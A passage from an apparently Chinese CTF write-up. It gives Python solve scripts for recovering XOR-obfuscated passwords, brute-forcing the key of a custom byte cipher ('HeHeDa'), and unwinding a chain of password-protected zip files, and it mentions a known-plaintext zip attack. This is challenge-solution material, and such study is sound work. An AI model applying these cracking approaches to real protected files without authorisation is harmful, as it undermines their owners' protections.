&nbsp;&nbsp;&nbsp;&nbsp;res&nbsp;+=&nbsp;chr(ord(key[i])^ord(value[i]))
&nbsp;
print&nbsp;res
&nbsp;
求pass2
len&nbsp;=&nbsp;0x13
&nbsp;
ds&nbsp;=&nbsp;[59,76,125,122,90,125,117,122,95,97,117,125,88,113,106,59]
res&nbsp;=&nbsp;&#39;&#39;
for&nbsp;d&nbsp;in&nbsp;ds:
&nbsp;&nbsp;&nbsp;&nbsp;res&nbsp;+=&nbsp;chr(d^len)
&nbsp;
print&nbsp;&#39;[/&#39;+res+&#39;/]&#39;</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">&nbsp;</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">求得两个pass为：</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0122acf4c1137e1df2.png" title="t0179b965ce713f64a0.png" alt="http://p8.qhimg.com/t0179b965ce713f64a0.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">然后弹出来一个背景，不知道怎么继续下去了。后来猜背景后面可能有东西，然后nop掉几个画矩阵和椭圆的函数，就看到flag了。</span></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);"><br/></span></strong></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">Crypto&amp;Exploit</span></strong></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">100&nbsp; HeHeDa</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">题目给了个加密程序，不知道加密的密钥是什么，但是知道是8位。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">给出的out的结果实际上就是字符本身的二进制。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">而且加密过程虽然很复杂，但是是逐位的，所以一位一位推可以推出密钥的值。密钥在计算的过程中被重复使用。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">使用前8个字符推断密钥，密钥的可取值为：</span></p><table cellspacing="0" cellpadding="0"><tbody><tr class="firstRow"><td width="553" valign="top" style="border-color: windowtext; border-width: 1px; padding: 0px 7px;"><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">64 94 137 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">38 78 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">35 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">113 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">68 243 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">57 84 153 163 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">51 245 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">0 4 95 157 163 ==</span></p></td></tr></tbody></table><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">后面几个：</span></p><table cellspacing="0" cellpadding="0"><tbody><tr class="firstRow"><td width="553" valign="top" style="border-color: windowtext; border-width: 1px; padding: 0px 7px;"><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">94 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">38 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">35 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">27 113 ==</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">22 68 ==</span></p></td></tr></tbody></table><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">那么密钥的取值最后三位不确定：</span></p><pre class="brush:bash;toolbar:false">94,38,35,113,68</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span><br/></p><p><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">我们写个程序 枚举所有密钥 并计算flag</span></p><p><br/></p><pre class="brush:python;toolbar:false">def&nbsp;LShift(t,&nbsp;k):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;k&nbsp;%=&nbsp;8
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;((t&nbsp;&lt;&lt;&nbsp;k)&nbsp;|&nbsp;(t&nbsp;&gt;&gt;&nbsp;(8&nbsp;-&nbsp;k)))&nbsp;&amp;&nbsp;0xff
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;def&nbsp;encode(p):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(8):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ret&nbsp;=&nbsp;(&#39;|&#39;&nbsp;if&nbsp;(p&nbsp;&gt;&gt;&nbsp;i)&nbsp;&amp;&nbsp;1&nbsp;else&nbsp;&#39;O&#39;)&nbsp;+&nbsp;ret
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;ret
&nbsp;&nbsp;&nbsp;
&nbsp;plaintemp&nbsp;=&nbsp;bytearray(&quot;asdfghjk123456&quot;)
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;def&nbsp;calc(key,plain=plaintemp):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A&nbsp;=&nbsp;[85,&nbsp;128,&nbsp;177,&nbsp;163,&nbsp;7,&nbsp;242,&nbsp;231,&nbsp;69,&nbsp;185,&nbsp;1,&nbsp;91,&nbsp;89,&nbsp;80,&nbsp;156,&nbsp;81,&nbsp;9,&nbsp;102,&nbsp;221,&nbsp;195,&nbsp;33,&nbsp;31,&nbsp;131,&nbsp;179,&nbsp;246,&nbsp;15,&nbsp;139,&nbsp;205,&nbsp;49,&nbsp;107,&nbsp;193,&nbsp;5,&nbsp;63,&nbsp;117,&nbsp;74,&nbsp;140,&nbsp;29,&nbsp;135,&nbsp;43,&nbsp;197,&nbsp;212,&nbsp;0,&nbsp;189,&nbsp;218,&nbsp;190,&nbsp;112,&nbsp;83,&nbsp;238,&nbsp;47,&nbsp;194,&nbsp;68,&nbsp;233,&nbsp;67,&nbsp;122,&nbsp;138,&nbsp;53,&nbsp;14,&nbsp;35,&nbsp;76,&nbsp;79,&nbsp;162,&nbsp;145,&nbsp;51,&nbsp;90,&nbsp;234,&nbsp;50,&nbsp;6,&nbsp;225,&nbsp;250,&nbsp;215,&nbsp;133,&nbsp;180,&nbsp;97,&nbsp;141,&nbsp;96,&nbsp;20,&nbsp;226,&nbsp;3,&nbsp;191,&nbsp;187,&nbsp;57,&nbsp;168,&nbsp;171,&nbsp;105,&nbsp;113,&nbsp;196,&nbsp;71,&nbsp;239,&nbsp;200,&nbsp;254,&nbsp;175,&nbsp;164,&nbsp;203,&nbsp;61,&nbsp;16,&nbsp;241,&nbsp;40,&nbsp;176,&nbsp;59,&nbsp;70,&nbsp;169,&nbsp;146,&nbsp;247,&nbsp;232,&nbsp;152,&nbsp;165,&nbsp;62,&nbsp;253,&nbsp;166,&nbsp;167,&nbsp;182,&nbsp;160,&nbsp;125,&nbsp;78,&nbsp;28,&nbsp;130,&nbsp;159,&nbsp;255,&nbsp;124,&nbsp;153,&nbsp;56,&nbsp;58,&nbsp;143,&nbsp;150,&nbsp;111,&nbsp;207,&nbsp;206,&nbsp;32,&nbsp;144,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;75,&nbsp;39,&nbsp;10,&nbsp;201,&nbsp;204,&nbsp;77,&nbsp;104,&nbsp;65,&nbsp;219,&nbsp;98,&nbsp;210,&nbsp;173,&nbsp;249,&nbsp;13,&nbsp;12,&nbsp;103,&nbsp;101,&nbsp;21,&nbsp;115,&nbsp;48,&nbsp;157,&nbsp;147,&nbsp;11,&nbsp;99,&nbsp;227,&nbsp;45,&nbsp;202,&nbsp;158,&nbsp;213,&nbsp;100,&nbsp;244,&nbsp;54,&nbsp;17,&nbsp;161,&nbsp;123,&nbsp;92,&nbsp;181,&nbsp;243,&nbsp;184,&nbsp;188,&nbsp;84,&nbsp;95,&nbsp;27,&nbsp;72,&nbsp;106,&nbsp;192,&nbsp;52,&nbsp;44,&nbsp;55,&nbsp;129,&nbsp;208,&nbsp;109,&nbsp;26,&nbsp;24,&nbsp;223,&nbsp;64,&nbsp;114,&nbsp;19,&nbsp;198,&nbsp;23,&nbsp;82,&nbsp;120,&nbsp;142,&nbsp;178,&nbsp;214,&nbsp;186,&nbsp;116,&nbsp;94,&nbsp;222,&nbsp;86,&nbsp;251,&nbsp;36,&nbsp;4,&nbsp;248,&nbsp;132,&nbsp;25,&nbsp;211,&nbsp;199,&nbsp;30,&nbsp;87,&nbsp;60,&nbsp;127,&nbsp;155,&nbsp;41,&nbsp;224,&nbsp;151,&nbsp;237,&nbsp;136,&nbsp;245,&nbsp;37,&nbsp;170,&nbsp;252,&nbsp;8,&nbsp;42,&nbsp;209,&nbsp;46,&nbsp;108,&nbsp;88,&nbsp;183,&nbsp;149,&nbsp;110,&nbsp;66,&nbsp;235,&nbsp;229,&nbsp;134,&nbsp;73,&nbsp;38,&nbsp;118,&nbsp;236,&nbsp;119,&nbsp;154,&nbsp;216,&nbsp;217,&nbsp;240,&nbsp;22,&nbsp;121,&nbsp;174,&nbsp;93,&nbsp;126,&nbsp;230,&nbsp;228,&nbsp;18,&nbsp;148,&nbsp;220,&nbsp;172,&nbsp;2,&nbsp;137,&nbsp;34]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;B&nbsp;=&nbsp;[0,&nbsp;2,&nbsp;3,&nbsp;7,&nbsp;1,&nbsp;5,&nbsp;6,&nbsp;4]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C&nbsp;=&nbsp;[179,&nbsp;132,&nbsp;74,&nbsp;60,&nbsp;94,&nbsp;252,&nbsp;166,&nbsp;242,&nbsp;208,&nbsp;217,&nbsp;117,&nbsp;255,&nbsp;20,&nbsp;99,&nbsp;225,&nbsp;58,&nbsp;54,&nbsp;184,&nbsp;243,&nbsp;37,&nbsp;96,&nbsp;106,&nbsp;64,&nbsp;151,&nbsp;148,&nbsp;248,&nbsp;44,&nbsp;175,&nbsp;152,&nbsp;40,&nbsp;171,&nbsp;251,&nbsp;210,&nbsp;118,&nbsp;56,&nbsp;6,&nbsp;138,&nbsp;77,&nbsp;45,&nbsp;169,&nbsp;209,&nbsp;232,&nbsp;68,&nbsp;182,&nbsp;91,&nbsp;203,&nbsp;9,&nbsp;16,&nbsp;172,&nbsp;95,&nbsp;154,&nbsp;90,&nbsp;164,&nbsp;161,&nbsp;231,&nbsp;11,&nbsp;21,&nbsp;3,&nbsp;97,&nbsp;70,&nbsp;34,&nbsp;86,&nbsp;124,&nbsp;114,&nbsp;119,&nbsp;223,&nbsp;123,&nbsp;167,&nbsp;47,&nbsp;219,&nbsp;197,&nbsp;221,&nbsp;193,&nbsp;192,&nbsp;126,&nbsp;78,&nbsp;39,&nbsp;233,&nbsp;4,&nbsp;120,&nbsp;33,&nbsp;131,&nbsp;145,&nbsp;183,&nbsp;143,&nbsp;31,&nbsp;76,&nbsp;121,&nbsp;92,&nbsp;153,&nbsp;85,&nbsp;100,&nbsp;52,&nbsp;109,&nbsp;159,&nbsp;112,&nbsp;71,&nbsp;62,&nbsp;8,&nbsp;244,&nbsp;116,&nbsp;245,&nbsp;240,&nbsp;215,&nbsp;111,&nbsp;134,&nbsp;199,&nbsp;214,&nbsp;196,&nbsp;213,&nbsp;180,&nbsp;189,&nbsp;224,&nbsp;101,&nbsp;202,&nbsp;201,&nbsp;168,&nbsp;32,&nbsp;250,&nbsp;59,&nbsp;43,&nbsp;27,&nbsp;198,&nbsp;239,&nbsp;137,&nbsp;238,&nbsp;50,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;149,&nbsp;107,&nbsp;247,&nbsp;7,&nbsp;220,&nbsp;246,&nbsp;204,&nbsp;127,&nbsp;83,&nbsp;146,&nbsp;147,&nbsp;48,&nbsp;17,&nbsp;67,&nbsp;23,&nbsp;93,&nbsp;115,&nbsp;41,&nbsp;191,&nbsp;2,&nbsp;227,&nbsp;87,&nbsp;173,&nbsp;108,&nbsp;82,&nbsp;205,&nbsp;49,&nbsp;1,&nbsp;66,&nbsp;105,&nbsp;176,&nbsp;22,&nbsp;236,&nbsp;29,&nbsp;170,&nbsp;110,&nbsp;18,&nbsp;28,&nbsp;185,&nbsp;235,&nbsp;61,&nbsp;88,&nbsp;13,&nbsp;165,&nbsp;188,&nbsp;177,&nbsp;230,&nbsp;130,&nbsp;253,&nbsp;150,&nbsp;211,&nbsp;42,&nbsp;129,&nbsp;125,&nbsp;141,&nbsp;19,&nbsp;190,&nbsp;133,&nbsp;53,&nbsp;84,&nbsp;140,&nbsp;135,&nbsp;10,&nbsp;241,&nbsp;222,&nbsp;73,&nbsp;12,&nbsp;155,&nbsp;57,&nbsp;237,&nbsp;181,&nbsp;36,&nbsp;72,&nbsp;174,&nbsp;207,&nbsp;98,&nbsp;5,&nbsp;229,&nbsp;254,&nbsp;156,&nbsp;178,&nbsp;128,&nbsp;55,&nbsp;14,&nbsp;69,&nbsp;30,&nbsp;194,&nbsp;122,&nbsp;46,&nbsp;136,&nbsp;160,&nbsp;206,&nbsp;26,&nbsp;102,&nbsp;218,&nbsp;103,&nbsp;139,&nbsp;195,&nbsp;0,&nbsp;144,&nbsp;186,&nbsp;249,&nbsp;79,&nbsp;81,&nbsp;75,&nbsp;212,&nbsp;234,&nbsp;158,&nbsp;163,&nbsp;80,&nbsp;226,&nbsp;65,&nbsp;200,&nbsp;38,&nbsp;187,&nbsp;113,&nbsp;63,&nbsp;24,&nbsp;25,&nbsp;142,&nbsp;51,&nbsp;228,&nbsp;35,&nbsp;157,&nbsp;216,&nbsp;104,&nbsp;162,&nbsp;15,&nbsp;89]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D&nbsp;=&nbsp;[2,&nbsp;4,&nbsp;0,&nbsp;5,&nbsp;6,&nbsp;7,&nbsp;1,&nbsp;3]
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;assert&nbsp;len(key)&nbsp;==&nbsp;8
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t1&nbsp;=&nbsp;bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;plain:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t1.append(A[i])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t2&nbsp;=&nbsp;bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(len(t1)):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t2.append(LShift(t1[i],&nbsp;B[i&nbsp;%&nbsp;8]))
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;times&nbsp;in&nbsp;range(16):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(len(t2)):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t2[i]&nbsp;=&nbsp;C[t2[i]]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(len(t2)):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t2[i]&nbsp;=&nbsp;LShift(t2[i],&nbsp;i&nbsp;^&nbsp;D[i&nbsp;%&nbsp;8])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(len(t2)):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t2[i]&nbsp;^=&nbsp;key[i&nbsp;%&nbsp;8]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;t2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;out&nbsp;+=&nbsp;encode(i)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;out
&nbsp;out=&#39;OO|OO||OO|||||OO|OO||O||O|O||O|||O|OOOOOOO|O|O|O|||||OO|||O|||OO||O|OOOOOO|O|OO|OO||||OO|||OOOO|||||O||||O|OO|O|O|O||OO|O||O|OO|O||O|||O||O|OO|OOOOOO||OOO|O|O|O|||O|OO|O|O||O||O||OOOOO|||OO|O|&#39;
&nbsp;&nbsp;&nbsp;flagout=&quot;OO||O||O|O|||OOOO||||||O|O|||OOO||O|OOOO||O|O|OO|||||OOOO||||O||OO|OO||O||O|O|O|||||OOOOOO|O|O||OOOOOOO||O|||OOOO||OO|OO|||O|OO|O|||O|O|OO|OOOO|OOO|OOO|OOOO||O|OO||||OO||||OOO|O|O||OO||||O||OOO|||O|OO|OO||OO||OOOO|O|&quot;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;j=0
&nbsp;&nbsp;&nbsp;while&nbsp;j&lt;14*8-8:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(0xff):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;calc([i,i,i,i,i,i,i,i])[j:j+8]==out[j:j+8]:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;i,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;==&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j+=8
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;kp2=[57,84,153,163]
&nbsp;kp3=[51,245]
&nbsp;kp4=[0,4,95,157,163]
&nbsp;&nbsp;&nbsp;
&nbsp;keylist=[]
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;for&nbsp;i1&nbsp;in&nbsp;kp2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i2&nbsp;in&nbsp;kp3:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i3&nbsp;in&nbsp;kp4:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=[94,38,35,113,68]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp.append(i1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp.append(i2)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp.append(i3)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;keylist.append(temp)
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;print&nbsp;keylist
&nbsp;&nbsp;&nbsp;for&nbsp;key&nbsp;in&nbsp;keylist:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fte=[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;ci&nbsp;in&nbsp;range(32):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;cc&nbsp;in&nbsp;range(0xff):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plaincc=[1]*(ci)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plaincc.append(cc)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rr=calc(key,plaincc)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;cc,plaincc,rr,ci
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;rr[ci*8:ci*8+8]==flagout[ci*8:ci*8+8]:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fte.append(chr(cc))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&#39;&#39;.join(fte)
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;#&nbsp;out&gt;&gt;
&nbsp;#&nbsp;OO|OO||O&nbsp;O|||||OO&nbsp;|OO||O||&nbsp;O|O||O||&nbsp;|O|OOOOO&nbsp;OO|O|O|O&nbsp;|||||OO|&nbsp;||O|||OO&nbsp;||O|OOOO&nbsp;OO|O|OO|&nbsp;OO||||OO&nbsp;|||OOOO|||||O||||O|OO|O|O|O||OO|O||O|OO|O||O|||O||O|OO|OOOOOO||OOO|O|O|O|||O|OO|O|O||O||O||OOOOO|||OO|O|
&nbsp;&nbsp;&nbsp;
&nbsp;#&nbsp;flag&nbsp;&gt;&gt;
&nbsp;#&nbsp;OO||O||O|O|||OOOO||||||O|O|||OOO||O|OOOO||O|O|OO|||||OOOO||||O||OO|OO||O||O|O|O|||||OOOOOO|O|O||OOOOOOO||O|||OOOO||OO|OO|||O|OO|O|||O|O|OO|OOOO|OOO|OOO|OOOO||O|OO||||OO||||OOO|O|O||OO||||O||OOO|||O|OO|OO||OO||OOOO|O|</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><br/></span><br/></p><p style="text-align:center"><img src="http://p7.qhimg.com/t013279bef33c1306d8.png" title="t017a6af3651ccf54e9.png" alt="http://p8.qhimg.com/t017a6af3651ccf54e9.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">发现只有一个flag没有乱码</span><br/></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);"><br/></span></strong></p><p><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px; color: rgb(0, 112, 192);">200&nbsp; Chain Rule</span></strong></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">很多带密码zip，提示说try start，推测有一个压缩包的解压密码是start，果然有一个是，解压出来的txt是下一个压缩包的解压密码，于是写个程序跑：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">import&nbsp;zipfile
&nbsp;&nbsp;&nbsp;import&nbsp;os
&nbsp;&nbsp;&nbsp;
&nbsp;a=os.listdir(&quot;crypto&quot;)
&nbsp;&nbsp;&nbsp;print&nbsp;a
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;def&nbsp;zipout(opath,outpath,password):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;zip&nbsp;=&nbsp;zipfile.ZipFile(opath,&nbsp;&quot;r&quot;,zipfile.zlib.DEFLATED)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;zip.extractall(path=outpath,members=zip.namelist()&nbsp;,&nbsp;pwd=password)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;ppass=&quot;start&quot;
&nbsp;&nbsp;&nbsp;while(1):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;f&nbsp;in&nbsp;a:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;zipout(r&quot;crypto/&quot;+f,r&quot;hehe/&quot;+f,ppass)==1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r=open(r&quot;hehe/&quot;+f+&quot;/1.txt&quot;,&quot;r&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rr=r.read()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;rr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r.close()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ppass=rr.split(&quot;\n&quot;)[0].split(&quot;is&nbsp;&quot;)[1]</pre><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;"><br/></span><br/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">能找到pwd.zip和flag.zip两个文件，pwd.zip是一个新的指来指去的游戏，flag.zip是个带密码的压缩文件.</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01335020b412e8525d.png" title="t01e7779159da487236.png" alt="http://p4.qhimg.com/t01e7779159da487236.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">后面有两种方法：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">第一种暴力一点直接明文攻击flag.zip就行，用AAPR。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">第二种：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">写个程序把这个新的指来指去的游戏玩完，注意查重，否则会无限循环，是有分支的：</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">最后是这样：</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01d00b059cef39c9f1.png" title="t01ac28cd9853b57010.png" alt="http://p9.qhimg.com/t01ac28cd9853b57010.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">于是用zipinfo -v可以获得每个文件的comment，有三种不同注释。</span></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 14px;">然后我做了一个回溯的表获得到达最后一个信息的遍历路径，然后组合起来，后面就是套路了</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t010067095109bfd185.png" title="t01253f207542acc596.png" alt="http://p2.qhimg.com/t01253f207542acc596.png"/></p><p><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 